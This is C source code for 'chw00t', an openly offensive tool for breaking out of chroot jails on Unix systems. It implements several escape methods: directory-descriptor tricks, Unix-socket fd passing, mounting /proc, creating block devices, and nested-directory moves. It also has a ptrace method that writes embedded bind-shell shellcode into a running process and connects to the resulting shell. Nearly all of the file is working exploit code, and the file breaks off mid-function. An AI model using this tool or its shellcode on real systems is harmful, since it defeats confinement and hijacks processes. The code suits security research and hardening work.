/*
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * Balazs Bucsay wrote this file.  As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return.    chroot@rycon.hu
 * (Lincense is stolen from Poul-Henning Kamp)
 * ----------------------------------------------------------------------------
 */

#if __sun
// on Solaris: gcc chw00t.c -o chw00t -lsocket
#define _XOPEN_SOURCE 1
#define _XOPEN_SOURCE_EXTENDED 1
#define __EXTENSIONS__
#endif
#include <sys/types.h>
#if !__sun
#include <sys/ptrace.h>
#endif
#include <sys/wait.h>
#include <sys/un.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <dirent.h>
#include <getopt.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/user.h>
#if __linux__
#include <sys/mount.h>
#endif
#if __OpenBSD__ || __DragonFly__
#include <machine/reg.h>
#endif

//FreeBSD
#ifndef PTRACE_ATTACH
#define PTRACE_ATTACH PT_ATTACH
#define PTRACE_DETACH PT_DETACH
#define PTRACE_GETREGS PT_GETREGS
#define PTRACE_POKEDATA PT_WRITE_D
#endif
#if __FreeBSD__ || __OpenBSD__ || __DragonFly__
#define X86_SHELLCODE_LEN 73
#define X86_SHELLCODE_PORT1 6
#define X86_SHELLCODE_PORT2 7
#define X86_SHELLCODE \
	"\x31\xc0\x50\x68\xff\x02\x11\x5c\x89\xe7\x50\x6a\x01\x6a\x02" \
	"\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x68\x58\xcd\x80\x89" \
	"\x47\xec\xb0\x6a\xcd\x80\xb0\x1e\xcd\x80\x50\x50\x6a\x5a\x58" \
	"\xcd\x80\xff\x4f\xe4\x79\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f" \
	"\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80"

#if __x86_64__
#define X64_SHELLCODE_LEN 93
#define X64_SHELLCODE_PORT1 19
#define X64_SHELLCODE_PORT2 20
#define X64_SHELLCODE \
	"\x6a\x61\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52" \
	"\x48\xba\x00\x02\x11\x5c\x00\x00\x00\x00\x52\x48\x89\xe6\x6a" \
	"\x10\x5a\x04\x66\x0f\x05\x48\x31\xf6\x6a\x6a\x58\x0f\x05\x99" \
	"\x04\x1e\x0f\x05\x48\x89\xc7\x6a\x5a\x58\x0f\x05\xff\xc6\x04" \
	"\x5a\x0f\x05\xff\xc6\x04\x59\x0f\x05\x52\x48\xbf\x2f\x2f\x62" \
	"\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x04" \
	"\x39\x0f\x05"
#endif
#endif

//\FreeBSD

#if __linux__
#define X86_SHELLCODE_LEN 78
#define X86_SHELLCODE_PORT1 21
#define X86_SHELLCODE_PORT2 22
#define X86_SHELLCODE \
	"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
        "\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
        "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
        "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
        "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
        "\x0b\xcd\x80"

#if __x86_64__
#define X64_SHELLCODE_LEN 86
#define X64_SHELLCODE_PORT1 20
#define X64_SHELLCODE_PORT2 21
#define X64_SHELLCODE \
	"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52" \
        "\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31" \
        "\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f" \
        "\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75" \
        "\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" \
        "\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
#endif
#endif

#define MAX_DEPTH	255
#define BUFLEN		255*16
#define SHELLNUM	11
#define FSNUM		6

#if __linux__
#define SOCKETNAME	"#anonsocket"
#else
#define SOCKETNAME	"/anonsocket"
#endif

#ifndef OPEN_MAX
#define OPEN_MAX	255
#endif
#ifndef PID_MAX
#define PID_MAX		65535 // 2^16-1
#endif

// symlinks on shells could result in segfault on solaris
char *shells[] = {"/bin/bash", "/bin/sh", "/bin/dash", "/bin/ksh",
        "/bin/csh", "/usr/bin/sh", "/usr/bin/bash", 
        "/bin/ksh", "/usr/bin/csh", "/usr/bin/dash",
        "/usr/bin/zsh" };

#if !__OpenBSD__ && !__NetBSD__
int send_fd(int sock, const int fd)
{
    struct {
        struct cmsghdr h;
        int fd;
    } buffer;
    struct msghdr msghdr;
    char nothing = '!';
    struct iovec nothing_ptr;
    struct cmsghdr *cmsg;

    nothing_ptr.iov_base = &nothing;
    nothing_ptr.iov_len = 1;
    msghdr.msg_name = NULL;
    msghdr.msg_namelen = 0;
    msghdr.msg_iov = &nothing_ptr;
    msghdr.msg_iovlen = 1;
    msghdr.msg_flags = 0;
    msghdr.msg_control = &buffer;
    msghdr.msg_controllen = sizeof(struct cmsghdr) + sizeof(int);
    cmsg = CMSG_FIRSTHDR(&msghdr);
    cmsg->cmsg_len = msghdr.msg_controllen;
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    *((int *)CMSG_DATA(cmsg)) = fd;
    return(sendmsg(sock, &msghdr, 0) >= 0 ? 0 : -1);
}

int recv_fd(int sock, int *fd)
{
    struct {
        struct cmsghdr h;
        int fd;
    } buffer;
    struct msghdr msghdr;
    char nothing;
    struct iovec nothing_ptr;
    struct cmsghdr *cmsg;

    nothing_ptr.iov_base = &nothing;
    nothing_ptr.iov_len = 1;
    msghdr.msg_name = NULL;
    msghdr.msg_namelen = 0;
    msghdr.msg_iov = &nothing_ptr;
    msghdr.msg_iovlen = 1;
    msghdr.msg_flags = 0;
    msghdr.msg_control = &buffer;
    msghdr.msg_controllen = sizeof(struct cmsghdr) + sizeof(int);
    cmsg = CMSG_FIRSTHDR(&msghdr);
    cmsg->cmsg_len = msghdr.msg_controllen;
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
//    *((int *)CMSG_DATA(cmsg)) = -1;

    if(recvmsg(sock, &msghdr, 0) < 0)
        return(-1);
    *fd = *((int *)CMSG_DATA(cmsg));
    return 1;
}

#endif

#if !__sun
void putdata(pid_t child, long addr,
             char *str, int len)
{   char *laddr;
    int i, j;
    union u {
            long val;
            char chars[sizeof(int)];
    } data;

    i = 0;
    j = len / sizeof(int);
    laddr = str;
    while(i < j) {
        memcpy(data.chars, laddr, sizeof(int));
        ptrace(PTRACE_POKEDATA, child,
               (void*)addr + i * sizeof(int), data.val);
        ++i;
        laddr += sizeof(int);
    }
    j = len % sizeof(int);
    if(j != 0) {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child,
               (void*)addr + i * sizeof(int), data.val);
    }
}
#endif

void usage(char *tool)
{
    
#if !__NetBSD__
    printf("Usage of chw00t - Unices chroot breaking tool:\n\n"
	"[*] Methods:\n"
#if !__FreeBSD__ && !__OpenBSD__
	"    -0\tClassic\n"
#endif
#if !__FreeBSD__ && !__OpenBSD__ && !__DragonFly__
	"    -1\tClassic with saved file descriptor\n"
#endif
#if !__OpenBSD__
	"    -2\tUnix domain socket\n"
#endif
#if !__FreeBSD__ && !__OpenBSD__ && !__DragonFly__ && \
	!__APPLE__
	"    -3\tMount /proc\n"
#endif
#if !__FreeBSD__ && !__OpenBSD__ && !__DragonFly__ && \
	!__APPLE__ && !__sun
	"    -4\tMake block device (mknod)\n"
#endif
	"    -5\tMove out of chroot (nested)\n"
#if !__APPLE__ && !__sun && !__DragonFly__
	"    -6\tPtrace x32 for 32bit processes\n"
#if __x86_64__
	"    -7\tPtrace x64 for 64bit processes\n"
#endif
#endif
#if __linux__
	"    -9\tOpen filedescriptor (demo purposes)\n"
#endif
	"\n"
	"[*] Paramaters:\n"
	"    --pid PID\t\tPID to ptrace\n"
	"    --port PORT\t\tPort for listening (default: 4444)\n"
	"    --dir NAME\t\tChroot directory name\n"
	"    --nestdir NAME\tNested chroot directory name\n"
	"    --tempdir NAME\tNew temporary directory name\n\n"
	"[*] Miscellaneous:\n"
	"    --help/-h\tThis help\n\n");
#else
    printf("NetBSD is not supported at the moment\n");
#endif
}

int movetotheroot()
{
    int i;

    for (i = 0; i < MAX_DEPTH; i++)
    {
	if (chdir(".."))
	    return 0xDEADBEEF;
    }

    return 0;
}
#if !__FreeBSD__ && !__OpenBSD__ && !__NetBSD__
int classic(char *dir) {
    int err, i;
    struct stat dirstat;
    
    printf("clssic\n");
    if ((err = stat(dir, &dirstat)) == 0) 
    {
	printf("[-] %s exists, please remove\n", dir);
	return 0xDEADBEEF;
    }
    
    printf("[+] creating %s directory\n", dir);
    if (mkdir(dir, 0700))
    {
	printf("[-] error creating %s\n", dir);
	return 0xDEADBEEF;
    }

    printf("[+] chrooting to %s\n", dir);
    if (chroot(dir))
    {
	printf("[-] chroot failed to %s\n", dir);
	return 0xDEADBEEF;
    }
	
    printf("[+] change working directory to real root\n");
    if (movetotheroot())
    {
	printf("[-] chdir failed to real root\n");
	return 0xDEADBEEF;
    }
	

    printf("[+] chrooting to real root\n");
    if (chroot("."))
    {
	printf("[-] chroot failed\n");
	return 0xDEADBEEF;
    }
    
    for (i=0; i<SHELLNUM; i++)
    {
	if ((err = stat(shells[i], &dirstat)) == 0)
	{
#if !__sun
            return execve(shells[i], NULL, NULL);
#else
            return execl(shells[i], NULL, NULL);
#endif
	}
    }

    return 0;
}
#endif

#if !__FreeBSD__ && !__OpenBSD__ && !__DragonFly__ && !__NetBSD__
int classicfd(char *dir) {
    int err, i;
    struct stat dirstat;
    DIR *dird;
    
    if ((err = stat(dir, &dirstat)) == 0) 
    {
	printf("[-] %s exists, please remove\n", dir);
	return 0xDEADBEEF;
    }
    
    printf("[+] creating %s directory\n", dir);
    if (mkdir(dir, 0700))
    {
	printf("[-] error creating %s\n", dir);
	return 0xDEADBEEF;
    }
    
    printf("[+] opening %s directory\n", dir);
    if ((dird = opendir(".")) == NULL)
    {
	printf("[-] error opening %s\n", dir);
	return 0xDEADBEEF;
    }

    printf("[+] P: change working directory to: %s\n", dir);
    if (chdir(dir))
    {
	printf("[-] P: cannot change directory\n");	
	return 0xDEADBEEF;
    }

    printf("[+] chrooting to %s\n", dir);
    if (chroot("."))
    {
	printf("[-] chroot failed to %s\n", dir);
	return 0xDEADBEEF;
    }

    printf("[+] change back to the start directory\n");
    if (fchdir(dirfd(dird)))
    {
	printf("[-] cannot change directory\n");
	return 0xDEADBEEF;
    }
	
    printf("[+] change working directory to real root\n");
    if (movetotheroot())
    {
	printf("[-] chdir failed to real root\n");
	return 0xDEADBEEF;
    }

    printf("[+] chrooting to real root\n");
    if (chroot("."))
    {
	printf("[-] chroot failed\n");
	return 0xDEADBEEF;
    }
    
    for (i=0; i<SHELLNUM; i++)
    {
	if ((err = stat(shells[i], &dirstat)) == 0)
	{
#if !__sun
            return execve(shells[i], NULL, NULL);
#else
            return execl(shells[i], NULL, NULL);
#endif
	}
    }

    return 0;
}
#endif

#if !__OpenBSD__ && !__NetBSD__
int uds(char *dir) 
{
    int err, i, fd, fd2, socket_fd, connection_fd;
    struct stat dirstat;
    pid_t pid;
    // no idea why, but without this ~16bytes, socket is not going to work
    char solarisstackcorruption[16];
    // omg.
    DIR *dird;
    struct sockaddr_un addr;
    socklen_t addr_length;
    
    if ((err = stat(dir, &dirstat)) == 0) 
    {
	printf("[-] %s exists, please remove\n", dir);
	return 0xDEADBEEF;
    }
    
    printf("[+] creating %s directory\n", dir);
    if (mkdir(dir, 0700))
    {
	printf("[-] error creating %s\n", dir);
	return 0xDEADBEEF;
    }

    printf("[+] forking...\n");
    pid = fork();

    /* pid != 0 -> parent, create socket, opendir, 
       send fd to child thru unix domain socket 
       pid == 0 -> child, create socket, get fd from parent, breakout */
    if (pid)
    {
	printf("[+] P: change working directory to: %s\n", dir);
	if (chdir(dir))
	{
	    printf("[-] P: cannot change directory\n");	
	    return 0xDEADBEEF;
	}
	
	printf("[+] P: chrooting to %s\n", dir);
	if (chroot("."))
	{
	    printf("[-] P: chroot failed to %s\n", dir);
	    return 0xDEADBEEF;
	}
	printf("[+] P: is sleeping for one second\n");
	sleep(1);

        printf("[+] P: creating socket\n");
        if ((socket_fd = socket(PF_UNIX, SOCK_STREAM, 0)) < 0)
	{
	    printf("[-] P: error creating socket\n");
            return 0xDEADBEEF;
        }
        memset(&addr, 0, sizeof(struct sockaddr_un));
        addr.sun_family = AF_UNIX;
        snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", SOCKETNAME);
#if !__FreeBSD__ && !__DragonFly__ && !__APPLE__ && !__sun
	// setting abstract named socket here, to be accessible from chroot
	// could be standard uds as well, just putting it under the new chroot
	addr.sun_path[0] = 0;
#endif

	printf("[+] P: connecting socket\n");
	if (connect(socket_fd, (struct sockaddr *)&addr, 
	    sizeof(struct sockaddr_un)))
	{
	    printf("[-] P: error connecting socket: %s\n", strerror(errno));
                        return 0xDEADBEEF;
	}

	printf("[+] P: receiving file descriptor thru unix domain socket\n");
	if ((err = recv_fd(socket_fd, &fd)) < 0)
	{
	    printf("[-] P: error receiving file descriptor: %d\n", err);
                        return 0xDEADBEEF;
	}
	
	printf("[+] P: duplicating file descriptor\n");
	if ((fd2 = dup(fd)) == -1)
	{
	    printf("[-] P: error duplicating fd\n");
                        return 0xDEADBEEF;
	}

	printf("[+] P: change back to the start directory\n");
	if (fchdir(fd))
	{
	    printf("[-] P: cannot change directory: %s\n", strerror(errno));
	    return 0xDEADBEEF;
	}
	
	printf("[+] P: change working directory to real root\n");
	if (movetotheroot())
	{
	    printf("[-] P: cannot change directory\n");
	    return 0xDEADBEEF;
	}

	printf("[+] P: chrooting to real root\n");
	if (chroot(".") != 0)
	{
	    printf("[-] P: chroot failed\n");
	    return 0xDEADBEEF;
	}
    
        printf("[+] P: closing socket\n");
        close(socket_fd);

	for (i=0; i<SHELLNUM; i++)
	{
	    if ((err = stat(shells[i], &dirstat)) == 0)
	    {
#if !__sun
		return execve(shells[i], NULL, NULL);
#else
		return execl(shells[i], NULL, NULL);
#endif
	    }
	}

	return 0;
    }
    else
    {
	printf("[+] C: opening %s directory\n", dir);
        if ((dird = opendir(".")) == NULL)
        {
	    printf("[-] C: error opening %s\n", dir);
	    return 0xDEADBEEF;
	}

	printf("[+] C: creating socket\n");
	if ((socket_fd = socket(PF_UNIX, SOCK_STREAM, 0)) < 0)
	{
	    printf("[-] C: error creating socket\n");
		    return 0xDEADBEEF;
	}
	memset(&addr, 0, sizeof(struct sockaddr_un));
	addr.sun_family = AF_UNIX;
#if !__FreeBSD__ && !__DragonFly__ && !__APPLE__ && !__sun
	snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", SOCKETNAME);
	addr.sun_path[0] = 0;
#else
	snprintf(addr.sun_path, sizeof(addr.sun_path), "%s/%s", dir, SOCKETNAME);
#endif
	printf("[+] C: binding socket\n");
	if(bind(socket_fd, (struct sockaddr *)&addr, 
	    sizeof(struct sockaddr_un)) != 0)
	{
	    printf("[-] C: error bind on socket: %s\n", strerror(errno));
            return 0xDEADBEEF;
	}
	
	printf("[+] C: listening on socket\n");
	if (listen(socket_fd, 5))
	{
	    printf("[-] C: error listen on socket\n");
            return 0xDEADBEEF;
	}

	printf("[+] C: waiting for connection\n");
	if ((connection_fd = accept(socket_fd, (struct sockaddr *)&addr, 
	    &addr_length)) == -1)
	{
	    printf("[-] C: error accepting connection\n");
            return 0xDEADBEEF;
	}

	printf("[+] C: sending %s's file descriptor thru unix "
		"domain socket\n", dir);
	if (send_fd(connection_fd, dirfd(dird)) == -1)
	{
	    printf("[-] C: sending fd thru unix domain socket failed\n");
            return 0xDEADBEEF;
	}
	sleep(1);
	printf("[+] C: closing sockets\n");
	close(connection_fd);
	close(socket_fd);
	printf("[+] C: exiting\n");
    }

    return 0;
}
#endif

#if !__FreeBSD__ && !__OpenBSD__ && !__DragonFly__ && \
        !__APPLE__ && !__NetBSD__
int mountproc(char *dir) 
{
    int err, i;
    pid_t pid;
    struct stat ownstat, otherstat;
    DIR *dird;
    struct dirent *pdirent;
    char *rootname; // "/proc/$pid$/root"
    int return_code = 0xDEADBEEF;
#if __sun
    char optbuf[0x400];
    char slashdir[255];
#endif
    
    pid = getpid();
    if ((rootname = malloc(8+sizeof(unsigned long long)+strlen(dir))) == NULL)
    {
	printf("[-] Error allocating memory\n");
	goto safe_exit;
    }
    memset(rootname, 0, 8+sizeof(unsigned long long)+strlen(dir));
    sprintf(rootname, "/%s/%llu/root", dir, (unsigned long long)pid);
    
    printf("[+] looking for /proc\n");
    if ((err = stat(dir, &ownstat)) != 0) 
    {
	printf("[+] %s is not created, creating one\n", dir);
	if (mkdir(dir, 0555))
	{
	    printf("[-] error creating %s\n", dir);
	    goto safe_exit;
	}
    }
    
    if ((err = stat(rootname, &ownstat)) != 0) 
    {
	printf("[+] %s is created, mounting procfs\n", dir);
#if __linux__
	if (mount("proc", dir, "proc", 0, NULL))
#elif __sun
	memset(optbuf, 0, 0x400);
	memset(slashdir, 0, sizeof(slashdir));
	snprintf(slashdir, sizeof(slashdir)-1, "/%s", dir);
	if (mount("proc", slashdir, 0x100, "proc", NULL, NULL, optbuf, 0x400))
#endif
	{
	    printf("[-] error mounting %s: %s\n", dir, strerror(errno));
	    goto safe_exit;
	}
	if ((err = stat(rootname, &ownstat)) != 0) 
	{
	    printf("[-] cannot find my own root: %s\n", strerror(errno));
	    goto safe_exit;
	}
    }

    if ((dird = opendir(dir)) == NULL)
    {
	printf("[-] error opening %s: %s\n", dir, strerror(errno));
	goto safe_exit;
    }

    while ((pdirent = readdir(dird)) != NULL)
    {
	if ((rootname = realloc(rootname, 
	    8+strlen(dir)+strlen(pdirent->d_name))) == NULL)
	{
	    printf("[-] Error reallocating memory\n");
	    goto safe_exit;
	}
	sprintf(rootname, "/%s/%s/root", dir, pdirent->d_name);
	if ((strncmp(pdirent->d_name, ".", 1)) && 
	    ((err = stat(rootname, &otherstat)) == 0)) 
	{
	    if (otherstat.st_ino != ownstat.st_ino)
	    {
		if ((dird = opendir(rootname)) != NULL)
		    break;
	    } 
	}
    }
    
    printf("[+] change back to the start directory\n");
    if (fchdir(dirfd(dird)))
    {
	printf("[-] cannot change directory\n");
	goto safe_exit;
    }
	
    printf("[+] chrooting to real root\n");
    if (chroot("."))
    {
	printf("[-] chroot failed\n");
	goto safe_exit;
    }
    
    for (i=0; i<SHELLNUM; i++)
    {
	if ((err = stat(shells[i], &ownstat)) == 0)
	{
#if !__sun
            return_code = execve(shells[i], NULL, NULL);
#else
            return_code = execl(shells[i], NULL, NULL);
#endif
	    goto safe_exit;
	}
    }

    return_code = 0;

safe_exit:
    if (rootname) free(rootname);
    return return_code;
}
#endif

#if !__FreeBSD__ && !__OpenBSD__ && !__DragonFly__ && \
        !__APPLE__ && !__sun && !__NetBSD__
int makeblockdevice(char *devdir, char *mountdir)
{
    int err, i, j, h;
    struct stat dirstat;
    char *shellname = NULL, *devname = NULL;
    char *filesystems[] = {"ext4", "ext3", "ext2", "zfs",
	    "ufs", "ufs2" };

    printf("[+] looking for %s\n", devdir);
    if ((err = stat(devdir, &dirstat)) != 0) 
    {
	printf("[+] %s is not created, creating one\n", devdir);
	if (mkdir(devdir, 0555))
	{
	    printf("[-] error creating %s\n", devdir);
	    return 0xDEADBEEF;
	}
	
    }
    
    printf("[+] looking for %s\n", mountdir);
    if ((err = stat(mountdir, &dirstat)) != 0) 
    {
	printf("[+] %s is not created, creating one\n", mountdir);
	if (mkdir(mountdir, 0555))
	{
	    printf("[-] error creating %s\n", mountdir);
	    return 0xDEADBEEF;
	}
    }
    if ((devname = malloc(strlen(devdir)+9)) == NULL)
    {
	printf("[-] error allocating memory\n");
        return 0xDEADBEEF;
    }
    sprintf(devname, "/%s/chw00t", devdir);

    // crawling for hda, hda, hdc - 3 block
    for (i=0; i<196; i++)
    {
	if (mknod(devname, S_IFBLK, makedev(3, i)) != 0)
	{
	    printf("[-] error creating block device: %s\n", strerror(errno));
	}
	for (j=0;j<FSNUM;j++)
	{
	    if (!mount(devname, mountdir, filesystems[j], 0, NULL))
		{   
		for (h=0; h<SHELLNUM; h++)
		{
                    if ((shellname = realloc(shellname, strlen(mountdir)+
                        strlen(shells[h])+1)) == NULL)
                    {   
                        printf("[-] error reallocating memory\n");
                        return 0xDEADBEEF;
                    }   
                    memset(shellname, 0, strlen(mountdir)+strlen(shells[h])+1);
                    sprintf(shellname, "%s%s", mountdir, shells[h]);
                    if (!stat(shellname, &dirstat)) 
                    {
                        if (!chdir(mountdir) && !chroot("."))
                        {
			    free(shellname);
			    return execve(shells[h], NULL, NULL);
			}
                    }
		}
		umount(mountdir);
		}
	}
	unlink(devname);
    }
    // crawling for sd[a-p] - 8 block
    for (i=0; i<256; i++)
    {
	if (mknod(devname, S_IFBLK, makedev(8, i)) != 0)
	{
	    printf("[-] error creating block device: %s\n", strerror(errno));
	}
	for (j=0;j<FSNUM;j++)
	{
	    if (!mount(devname, mountdir, filesystems[j], 0, NULL))
		{   
		for (h=0; h<SHELLNUM; h++)
		{
		    if ((shellname = realloc(shellname, strlen(mountdir)+
			strlen(shells[h])+1)) == NULL)
		    {
			printf("[-] error reallocating memory\n");
			return 0xDEADBEEF;
		    }
		    memset(shellname, 0, strlen(mountdir)+strlen(shells[h])+1);
		    sprintf(shellname, "%s%s", mountdir, shells[h]);
		    if (!stat(shellname, &dirstat)) 
		    {
			if (!chdir(mountdir) && !chroot("."))
                        {
			    free(shellname);
			    return execve(shells[h], NULL, NULL);
			}
		    }
		}
		umount(mountdir);
		}
	}
	unlink(devname);
    }
    
    return 0;

}
#endif

#if !__APPLE__ && !__sun && !__NetBSD__
int ptracepid(unsigned long long pid, int x64, unsigned int port) 
{
    pid_t traced_process;
#if __linux__
    struct user_regs_struct regs;
#else
    struct reg regs;
#endif
    int socketfd, nready;
    struct sockaddr_in serv_addr;
    struct timeval ts;
    fd_set fds;
    unsigned char buf[BUFLEN+1]; 
    int rv, one = 1;
    
    int len_x86 = X86_SHELLCODE_LEN;
    char shellcode_x86[] = X86_SHELLCODE;
#if __x86_64__
    int len_x64 = X64_SHELLCODE_LEN;
    char shellcode_x64[] = X64_SHELLCODE;
#endif

    if (port)
    {
#if __x86_64__
	if (x64)
	{
	    shellcode_x64[X64_SHELLCODE_PORT1] = (port >> 8) & 0xFF;
	    shellcode_x64[X64_SHELLCODE_PORT2] = port & 0xFF;
	}
#endif
	shellcode_x86[X86_SHELLCODE_PORT1] = (port >> 8) & 0xFF;
	shellcode_x86[X86_SHELLCODE_PORT2] = port & 0xFF;
    }
    else port = 4444;


    if (!pid)
    {
	// looking for a process, starting from our PID
	for (pid=getppid()-2;pid>2;pid--) 
	{
	    if (!kill(pid, 0))
	    {
		printf("[+] Found pid: %llu\n", pid);
   		printf("[+] PTRACE: attach process: %llu\n", pid);
    		traced_process = pid;
    		if (ptrace(PTRACE_ATTACH, traced_process, 0, 0))
    		{
		    printf("[-] error attaching process\n");
		    continue;
		}
		break;
	    }
	}
    }
    else
    {
	printf("[+] PTRACE: attach process: %llu\n", pid);
	traced_process = pid;
	if (ptrace(PTRACE_ATTACH, traced_process, 0, 0))
	{
	    printf("[-] error attaching process\n");
	    return 0xDEADBEEF;
	}
    }
    wait(NULL);
#if __linux__
    if (ptrace(PTRACE_GETREGS, traced_process, NULL, &regs))
#else
    if (ptrace(PTRACE_GETREGS, traced_process, (void*)&regs, 0))
#endif
    {
        printf("[-] error getting registers\n");
        return 0xDEADBEEF;
    }
    
    printf("[+] PTRACE: overwrite original bytecode\n");
#if __x86_64__
    if (x64) 
    {
#if __linux__
	putdata(traced_process, regs.rip,
#else
	putdata(traced_process, regs.r_rip,
#endif
	    shellcode_x64, len_x64);
    }
    else 
    {
#if __linux__
	putdata(traced_process, regs.rip,
#else
	putdata(traced_process, regs.r_rip,
#endif
            shellcode_x86, len_x86);
    }
#else
#if __linux__
    putdata(traced_process, regs.eip,
#else
    putdata(traced_process, regs.r_eip,
#endif
        shellcode_x86, len_x86);
#endif
    printf("[+] PTRACE: detach and sleep\n");
    if (ptrace(PTRACE_DETACH, traced_process, 0, 0))
    {
        printf("[-] error detaching process\n");
        return 0xDEADBEEF;
    }
    printf("[+] connecting to bindshell\n");

    sleep(1);
    if ((socketfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
	printf("[-] error@socket\n");
	return 0xDEADBEEF;
    }

#if __linux__
    // cannot be statically linked because of glibc reasons...
    setsockopt(socketfd, SOL_TCP, TCP_NODELAY, &one, sizeof(one));
#else
    setsockopt(socketfd, 6, TCP_NODELAY, &one, sizeof(one));
#endif
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (connect(socketfd, (struct sockaddr *) &serv_addr, 
	sizeof(serv_addr)) <0)
    {
	printf("[-] error@connect: %s\n", strerror(errno));
	return 0xDEADBEEF;
    }
    printf("[+] Connected!\n");

    ts.tv_sec = 1; // 1 second
    ts.tv_usec = 0;

    while (1) {
        FD_ZERO(&fds);
        if (socketfd != 0)
        FD_SET(socketfd, &fds);
        FD_SET(0, &fds);
 
        nready = select(socketfd + 1, &fds, (fd_set *) 0, (fd_set *) 0, &ts);
        if (nready < 0) {
            perror("select. Error");
            return 1;
        }
        else if (nready == 0) {
            ts.tv_sec = 1; // 1 second
            ts.tv_usec = 0;
        }
        else if (socketfd != 0 && FD_ISSET(socketfd, &fds)) 
	{
            // start by reading a single byte
	    memset(buf, 0, BUFLEN);
            if ((rv = recv(socketfd, buf, BUFLEN, 0)) < 0)
                return 1;
            else if (rv == 0) 
	    {
                printf("Connection closed by the remote end\n\r");
                return 0;
            }
 
        printf("%s", buf);
        }
        else if (FD_ISSET(0, &fds)) 
	{
        rv = read(fileno(stdin), buf, BUFLEN);
            if (send(socketfd, buf, rv, 0) < 0)
                return 1;
        }
    }
    close(socketfd);

    return 0;
}
#endif

#if !__NetBSD__
int moveooc(char *chrootdir, char *nesteddir, char *newdir) 
{
    int err, i, size;
    struct stat dirstat;
    pid_t pid;
    char *childdir = NULL;
    int return_value = 0xDEADBEEF;

    size = strlen(chrootdir)+strlen(nesteddir)+2;
    if ((childdir = malloc(size)) == NULL)
    {
	printf("[-] error allocating memory\n");
	goto safe_exit;
    }
    snprintf(childdir, size, "%s/%s", chrootdir, nesteddir);

    if ((err = stat(chrootdir, &dirstat)) == 0) 
    {
	printf("[-] %s exists, please remove\n", chrootdir);
	goto safe_exit;
    }
    if ((err = stat(newdir, &dirstat)) == 0)
    {
	printf("[-] %s exists, please remove\n", newdir);
	goto safe_exit;
    }
    
    printf("[+] creating %s directory\n", chrootdir);
    if (mkdir(chrootdir, 0700))
    {
	printf("[-] error creating %s\n", chrootdir);
	goto safe_exit;
    }

    printf("[+] creating %s directory\n", childdir);
    if (mkdir(childdir, 0700))
    {
	printf("[-] error creating %s\n", childdir);
	rmdir(chrootdir);
	goto safe_exit;
    }

    printf("[+] forking...\n");
    pid = fork();

    if (pid)
    {	
	
	printf("[+] 0: change working directory to: %s\n", chrootdir);
	if (chdir(chrootdir) != 0)
	{
	    printf("[-] 0: cannot change directory\n");
	    goto safe_exit;
	}
	
	printf("[+] 0: chrooting to %s\n", chrootdir);
	if (chroot(".") != 0)
	{
	    printf("[-] 0: chroot failed to %s\n", chrootdir);
	    goto safe_exit;
	}
	
	printf("[+] 0: change working directory to: %s\n", nesteddir);
	if (chdir(nesteddir) != 0)
	{
	    printf("[-] 0: cannot change directory\n");	
	    goto safe_exit;
	}

	printf("[+] 0: sleeping for 2 seconds\n");
	sleep(2);

	printf("[+] 0: change working directory to real root\n");
	if (movetotheroot())
	{
	    printf("[-] 0: cannot change directory ../\n");
	    goto safe_exit;
	}

	printf("[+] 0: chrooting to real root\n");
	if (chroot(".") != 0)
	{
	    printf("[-] 0: chroot failed\n");
	    goto safe_exit;
	}
	
	for (i=0; i<SHELLNUM; i++)
	{
	    if ((err = stat(shells[i], &dirstat)) == 0)
	    {
#if !__sun
                return_value = execve(shells[i], NULL, NULL);
#else
                return_value = execl(shells[i], NULL, NULL);
#endif
                goto safe_exit;
	    }
	}
    }
    else
    {
	printf("[+] 1: is sleeping for one second\n");
	sleep(1);
	printf("[+] 1: mv %s to %s\n", childdir, newdir);
	rename(childdir, newdir);
    }

    return_value = 0;

safe_exit:
    if (childdir) free(childdir);
    return return_value;
}
#endif

/*
    This one is only for demo purposes. Looks like identical as the classicfd()
    but it "emulates" a scenario where the process forks and does not close all
    the file descriptors. In case the chrooted process has open directory file
    descriptors, the process can break out the chroot. This should be 
    implemented as a shellcode.
*/
#if __linux__
int fddemo(char *dir)
{
    DIR *dird;
    int size, i, fd, err;
    struct stat fdstat;

